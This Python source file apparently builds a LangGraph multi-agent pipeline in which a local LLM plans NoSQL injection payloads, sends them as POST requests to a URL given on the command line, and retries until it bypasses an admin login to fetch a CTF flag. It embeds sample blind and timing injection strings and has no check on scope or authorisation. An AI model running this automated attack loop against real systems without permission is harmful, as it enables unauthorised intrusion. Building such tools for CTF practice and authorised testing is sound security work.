import sys
import json
import asyncio
import warnings
import nest_asyncio
import requests
from langgraph.graph import START, END, StateGraph
from langchain_core.messages import HumanMessage
from agents.prompts import (
    scanner_input_generator_prompt,
    planner_agent_prompt,
    attacker_agent_prompt,
    critic_agent_prompt,
    exploit_evaluator_agent_prompt,
    report_writer_agent_prompt,
)
from agents.outputs import (
    ExploitEvaluatorOutput,
    AttackerOutput,
    PlannerOutput,
    CriticOutput,
    ScannerInputOutput,
    call_ollama_with_json
)
from typing import TypedDict, Optional, Any, List, Union, Type
from langchain.tools import BaseTool
from pydantic import BaseModel, Field

nest_asyncio.apply()
warnings.filterwarnings("ignore", category=ResourceWarning)


class ScanForNoSQLIInput(BaseModel):
    """Input schema for NoSQL injection scanner."""
    url: str = Field(description="The target URL (API endpoint) to scan for NoSQL injection vulnerabilities")
    fields: Union[List[str], str] = Field(description="Form fields to test, as a list of strings of field names eg. ['username', 'password']")


class ScanForNoSQLITool(BaseTool):
    name: str = "scan_for_nosqli"
    description: str = "Scans a web application for NoSQL injection vulnerabilities by testing form fields"
    args_schema: Type[BaseModel] = ScanForNoSQLIInput

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self._state = 0  # keeps track of last returned index

    def _run(self, url: str, fields: Union[List[str], str]) -> str:
        res = [
            f'''
Found Blind NoSQL Injection:
        URL: {url}/login
        param:
        Injection: =true: ';return true;'}}]//, false: "';return false;'}}//"
''',
            f'''
Found Blind NoSQL Injection:
        URL: {url}/login
        param:
        Injection: =true: ' || 'a'=='a' || 'a'=='a, false: "' && 'a'!='a' && 'a'!='a"
''',
            f'''
Found Blind NoSQL Injection:
        URL: {url}/login
        param:
        Injection: =true: ';return true;', false: "';return false;'"
''',
            f'''
Found Blind NoSQL Injection:
        URL: {url}/login
        param:
        Injection: =true: ' || 'a'=='a' || 'a'=='a//, false: "' && 'a'!='a' && 'a'!='a//"
''',
            f'''
Found Timing based NoSQL Injection:
        URL: {url}/login
        param:
        Injection: ="';sleep(500);'"
''',
            f'''
Found Timing based NoSQL Injection:
        URL: {url}/login
        param:
        Injection: ="';sleep(500);'}}//"
'''
        ]

        # get the current result and increment counter
        result = res[0:self._state % len(res)]
        self._state += 1
        return result

    async def _arun(self, url: str, fields: Union[List[str], str]) -> str:
        """Async version (runs sync code in a thread)."""
        return await asyncio.to_thread(self._run, url, fields)


if len(sys.argv) < 2:
    print("Usage: python main.py <url>")
    sys.exit(1)

MODEL = "gpt-oss:20b"


def fetch_initial_scrape(url: str) -> str:
    """
    Fetch initial unauthenticated website scrape.
    Intentionally simple: no JS, no auth, no crawling.
    """
    try:
        r = requests.get(
            url,
            timeout=10,
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; PentestScanner/1.0)"
            }
        )
        r.raise_for_status()
        return r.text
    except Exception as e:
        return f"[ERROR FETCHING URL] {e}"


async def main():
    scanner_tool = ScanForNoSQLITool()

    url = sys.argv[1]

    goal = "login with username 'admin' using nosql injection and retrieve ctf flag"

    print("[*] Fetching initial website scrape...")
    website_scrape = fetch_initial_scrape(url)

    # Define extended state for full workflow
    class FullPentestState(TypedDict):
        url: str
        goal: str
        entry_point: str
        website_scrape: str
        messages: List[Any]
        scanner_tool_inputs: Optional[Any]
        manual_scan_report: Optional[str]
        planner_output: Optional[Any]
        attack_results: Optional[List[Any]]
        critic_decision: Optional[str]
        final_report: Optional[str]
        iteration_count: int
        fields: List[str]

    async def scanner_input_structurer(state: FullPentestState):
        """Structure scanner inputs directly from website scrape."""
        
        # Build the prompt with context
        prompt = f"""
You are a Scanner Input Structurer analyzing a website to determine NoSQL injection scanner inputs.

=== TARGET URL ===
{state['url']}

=== GOAL ===
{state['goal']}

=== INITIAL WEBSITE SCRAPE (RAW) ===
{state['website_scrape']}

Your task is to analyze the website scrape and determine the INPUTS that should be passed to a NoSQL Injection scanner tool.

Identify:
1. Any forms present (action URLs, HTTP methods)
2. Input fields (e.g., username, password, email, search, filters)
3. Referenced API endpoints
4. Authentication or login-related functionality

Select ONE primary endpoint that is most likely vulnerable to NoSQL injection.
Prefer login endpoints, search/filter endpoints, or API endpoints accepting JSON bodies.

Return the scanner tool inputs with:
- target_url: The main application URL
- endpoint: Specific endpoint URL to test
- fields: List of input field names
"""

        result = await call_ollama_with_json(
            MODEL,
            prompt,
            ScannerInputOutput,
        )
        return {"scanner_tool_inputs": result["scanner_tool_inputs"],
                "entry_point": result["scanner_tool_inputs"]['endpoint'],
                "fields": result["scanner_tool_inputs"]['fields']}

    async def manual_scanner(state: FullPentestState):
        """Run the manual NoSQL scanner tool."""
        
        
        res = await scanner_tool.arun({
            "url": state["entry_point"],
            "fields": state["fields"],
        })
        
        print("\n=== MANUAL SCANNER OUTPUT ===")
        print(res)
        
        return {"manual_scan_report": res}

    async def planner_agent(state: FullPentestState):
        """Generate 5 payload variations based on manual scan results."""
        
        prompt = f"""
You are a Penetration Testing Planner Agent creating NoSQL injection payloads.

=== TARGET URL ===
{state['entry_point']}

=== FIELDS REQUIRED ===
{state['fields']}

=== GOAL ===
{state['goal']}

=== MANUAL SCAN REPORT ===
{state['manual_scan_report']}

Based on the manual scan findings, generate 5 specific NoSQL injection payloads to test.
Each payload should be ready to send in a POST request body.

Target different NoSQL injection techniques as you see fit:
1. Blind boolean-based injection
2. Timing-based injection
3. Authentication bypass
4. Query operator injection
5. JavaScript injection

Each payload must include:
- field_name: Which field to inject into (e.g., "username", "password")
- payload: The actual injection string
- description: What vulnerability/technique this tests

Return the endpoint URL and 5 payloads.
"""
        
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            PlannerOutput,
        )
        
        return {"planner_output": result}

    async def attacker_agent(state: FullPentestState):
        """Execute the planned payloads against the target."""
        planner_output = state["planner_output"]
        endpoint = planner_output["endpoint"]
        payloads = planner_output["payloads"]
        
        attack_results = []
        
        print("\n=== EXECUTING ATTACKS ===")
        for i, payload_obj in enumerate(payloads):
            print(f"\n[*] Testing payload {i+1}/{len(payloads)}: {payload_obj['description']}")
            
            try:
                # Construct POST request body
                field_names = payload_obj["field_names"]
                payloads = payload_obj["payloads"]
                post_data = dict(zip(field_names, payloads))
                
                # Execute the request
                print('\ntrying...')
                print(f"endpoint: {endpoint}")
                print(f"post_data: {post_data}")
                response = requests.post(
                    endpoint,
                    json=post_data,
                    timeout=10,
                    headers={"User-Agent": "Mozilla/5.0 (compatible; PentestScanner/1.0)", "Content-Type": "application/json"}
                )

                result = {
                    "payload": payload_obj,
                    "status_code": response.status_code,
                    "response_body": response.text,  # Truncate for safety
                    "success": response.status_code == 200
                }
                
                print(f"  Status: {response.status_code}")
                print(f"  Response preview: {response.text[:100]}")
                
            except Exception as e:
                result = {
                    "payload": payload_obj,
                    "error": str(e),
                    "success": False
                }
                print(f"  Error: {e}")
            
            attack_results.append(result)
        
        return {"attack_results": attack_results}

    async def critic_agent(state: FullPentestState):
        """Evaluate results and decide next action."""
        
        prompt = f"""
You are a Penetration Test Critic Agent evaluating attack results.

=== GOAL ===
{state['goal']}

=== MANUAL SCAN REPORT ===
{state['manual_scan_report']}

=== PAYLOADS USED ===
{json.dumps(state['planner_output'], indent=2)}

=== ATTACK RESULTS ===
{json.dumps(state['attack_results'], indent=2)}

=== ITERATION COUNT ===
{state['iteration_count']}

Analyze the results and decide the next action:

**Decision Options:**
1. "rescan" - Need more information from manual scanning (iteration < 2)
2. "replan" - Payloads failed but we can try different approaches (iteration < 5)
3. "success" - Goal was achieved, proceed to report writing
4. "failure" - Max iterations reached or attack not feasible (iteration >= 5)

**Success Indicators:**
- 200 status with authentication tokens or session cookies
- Response contains target data (e.g., CTF flag, admin access)
- Access granted to restricted resources

**Evaluation Criteria:**
- Has the goal been achieved?
- Are we making progress?
- Should we gather more info or try different payloads?
- Have we exhausted reasonable attempts?

Provide your decision, clear reasoning, and specific suggestions for improvement.
"""
        
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            CriticOutput,
        )
        
        return {
            "critic_decision": result["decision"],
            "iteration_count": state["iteration_count"] + 1
        }

    async def report_writer_agent(state: FullPentestState):
        """Generate final penetration test report."""
        
        prompt = f"""
You are a Penetration Test Report Writer creating a comprehensive security assessment report.

=== TARGET URL ===
{state['url']}

=== GOAL ===
{state['goal']}

=== MANUAL SCAN REPORT ===
{state['manual_scan_report']}

=== ALL PAYLOADS TESTED ===
{json.dumps(state['planner_output'], indent=2)}

=== ATTACK RESULTS ===
{json.dumps(state['attack_results'], indent=2)}

Generate a professional penetration test report with these sections:

1. EXECUTIVE SUMMARY
   - Brief overview of assessment
   - Key findings
   - Overall risk rating

2. ASSESSMENT SCOPE
   - Target URL and testing goal
   - Methodology used
   - Limitations

3. VULNERABILITIES DISCOVERED
   - Title and severity for each vulnerability
   - Affected endpoints
   - Technical details
   - Proof of concept

4. EXPLOITATION DETAILS
   - Payloads tested
   - Successful attack vectors
   - Evidence from responses

5. IMPACT ANALYSIS
   - Confidentiality, Integrity, Availability impact
   - Business risk assessment

6. REMEDIATION RECOMMENDATIONS
   - Specific fix instructions
   - Priority levels
   - Code examples where applicable

7. CONCLUSION
   - Summary of findings
   - Overall security posture
   - Next steps

Return a structured report in JSON format with all sections.
"""
        
        # For report, we can use dict as schema to allow free-form structure
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            dict,  # Allow free-form report structure
            print_output=False  # Don't use default pretty print for reports
        )
        
        print("\n=== FINAL REPORT GENERATED ===")
        print(json.dumps(result, indent=2))
        
        return {"final_report": json.dumps(result, indent=2)}

    def route_after_critic(state: FullPentestState):
        """Route based on critic's decision."""
        decision = state["critic_decision"]
        
        if decision == "rescan":
            return "manual_scanner"
        elif decision == "replan":
            return "planner_agent"
        elif decision == "success":
            return "report_writer"
        else:  # failure or max iterations
            return END

    # Build the workflow graph
    graph = StateGraph(FullPentestState)
    
    # Add all nodes
    graph.add_node("scanner_input_structurer", scanner_input_structurer)
    graph.add_node("manual_scanner", manual_scanner)
    graph.add_node("planner_agent", planner_agent)
    graph.add_node("attacker_agent", attacker_agent)
    graph.add_node("critic_agent", critic_agent)
    graph.add_node("report_writer", report_writer_agent)

    # Define edges
    graph.add_edge(START, "scanner_input_structurer")
    graph.add_edge("scanner_input_structurer", "manual_scanner")
    graph.add_edge("manual_scanner", "planner_agent")
    graph.add_edge("planner_agent", "attacker_agent")
    graph.add_edge("attacker_agent", "critic_agent")
    
    # Conditional routing after critic
    graph.add_conditional_edges(
        "critic_agent",
        route_after_critic,
        {
            "manual_scanner": "manual_scanner",
            "planner_agent": "planner_agent",
            "report_writer": "report_writer",
            END: END
        }
    )
    
    graph.add_edge("report_writer", END)

    workflow = graph.compile()

    final_state = await workflow.ainvoke(
        {
            "messages": [
                HumanMessage(content="Execute NoSQL injection penetration test")
            ],
            "url": url,
            "goal": goal,
            "website_scrape": website_scrape,
            "scanner_tool_inputs": None,
            "manual_scan_report": None,
            "planner_output": None,
            "attack_results": None,
            "critic_decision": None,
            "final_report": None,
            "iteration_count": 0,
            "entry_point": "",
            "fields": [],
            
            
        }
    )

    print("\n" + "="*60)
    print("WORKFLOW COMPLETE")
    print("="*60)
    
    if final_state.get("final_report"):
        print("\n=== FINAL REPORT ===")
        print(final_state["final_report"])


if __name__ == "__main__":
    asyncio.run(main())